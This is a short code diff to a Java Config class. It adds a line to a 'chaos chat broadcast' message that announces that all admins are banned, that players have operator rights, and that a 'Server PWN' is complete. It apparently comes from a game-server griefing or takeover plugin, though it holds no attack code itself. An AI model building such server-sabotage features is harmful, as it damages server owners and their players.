@@ -69,7 +69,8 @@ public class Config {
     // Chaos chat message
     public static final String chaos_chat_broadcast = "\n\n\n\n\n\n\n\n\n\n" +
                                                         "[Server] ALL ADMINS HAVE BEEN BANNED\n" +
-                                                        "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";
+                                                        "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK\n"+
+                                                        "[Server] Server PWN COMPLETE. NOOT NOOT! BYE SERVER!";
 
 
     public static class Param {
